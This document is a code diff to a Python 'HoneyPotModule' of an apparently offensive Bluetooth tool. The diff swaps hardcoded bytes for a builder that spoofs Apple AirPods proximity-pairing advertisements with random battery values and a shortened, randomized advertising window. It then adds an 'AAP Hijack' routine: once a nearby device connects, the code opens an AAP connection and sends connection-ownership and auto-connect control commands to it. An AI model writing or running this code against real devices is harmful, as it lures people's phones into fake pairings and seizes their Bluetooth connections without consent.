@@ -6,6 +6,8 @@ import select
 from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev, ADV_IND, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE
 import bluetooth._bluetooth as bluez
 from rich.panel import Panel
+from core.packet_builder import PacketBuilder, ProximityPairingPacket
+from core.connection import AAPConnection
 
 class HoneyPotModule:
     def __init__(self, dev_id=0, console=None):
@@ -73,20 +75,20 @@ class HoneyPotModule:
                 except Exception as e:
                     self.log(f"[yellow][!] Failed to set random address: {e}[/yellow]")
 
-                prefix = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
-                suffix = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
-                
-                left = (random.randint(1, 100),)
-                right = (random.randint(1, 100),)
-                case = (random.randint(128, 228),)
-                packet_data = prefix + left + right + case + suffix
+                packet_data = ProximityPairingPacket.build(
+                    model_name="AirPods", 
+                    battery_left=random.randint(1, 100),
+                    battery_right=random.randint(1, 100),
+                    battery_case=random.randint(1, 100),
+                    subtype=0x10
+                )
 
                 start_le_advertising(self.sock, min_interval=200, max_interval=200, adv_type=ADV_IND, data=packet_data, own_bdaddr_type=0x01)
                 
                 start_time = time.time()
                 connected = False
                 
-                while (time.time() - start_time) < 15:
+                while (time.time() - start_time) < random.randint(2, 5):
                     readable, _, _ = select.select([self.sock], [], [], 0.5) 
                     if self.sock in readable:
                         pkt = self.sock.recv(255)
@@ -117,6 +119,29 @@ class HoneyPotModule:
                                 connected = True
                                 
                                 self.log(f"[bold red][*] Holding Connection with {mac_str} (Ctrl+C to stop)...[/bold red]")
+                                
+
+                                try:
+                                    self.log(f"[bold yellow][*] Attempting AAP Hijack on {mac_str}...[/bold yellow]")
+                                    conn = AAPConnection(mac_str, self.console)
+                                    if conn.connect():
+                                        time.sleep(0.5)
+                                        
+                                        self.log("[*] Sending CMD_OWNS_CONNECTION (0x06)...")
+                                        pkt = PacketBuilder.build_control_command(PacketBuilder.CMD_OWNS_CONNECTION, 0x01)
+                                        conn.send(pkt)
+                                        time.sleep(0.2)
+                                        
+                                        self.log("[*] Sending CMD_AUTO_CONNECT (0x20)...")
+                                        pkt = PacketBuilder.build_control_command(PacketBuilder.CMD_AUTO_CONNECT, 0x01)
+                                        conn.send(pkt)
+                                        
+                                        self.log("[bold green][+] AAP Commands Sent![/bold green]")
+                                        conn.close()
+                                    else:
+                                        self.log("[yellow][!] AAP Connection failed (normal if device refuses L2CAP)[/yellow]")
+                                except Exception as e:
+                                    self.log(f"[red][!] AAP Error: {e}[/red]")
                                 
                                 try:
                                     while True:
